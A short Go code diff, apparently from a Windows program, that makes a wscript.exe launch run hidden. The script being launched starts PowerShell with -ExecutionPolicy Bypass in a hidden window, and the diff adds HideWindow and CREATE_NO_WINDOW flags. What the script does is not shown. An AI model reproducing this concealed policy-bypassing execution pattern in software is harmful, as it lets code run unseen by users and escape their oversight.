@@ -11,6 +11,9 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"syscall"
+
+	"golang.org/x/sys/windows"
 )
 
 func fset(data_path string) {
@@ -63,5 +66,9 @@ objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""%s""", 0
 	os.WriteFile(tempScriptPath, []byte(vbscriptCode), 0644)
 
 	cmd := exec.Command("wscript.exe", "//Nologo", "//B", tempScriptPath)
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: windows.CREATE_NO_WINDOW,
+	}
 	cmd.Start()
 }
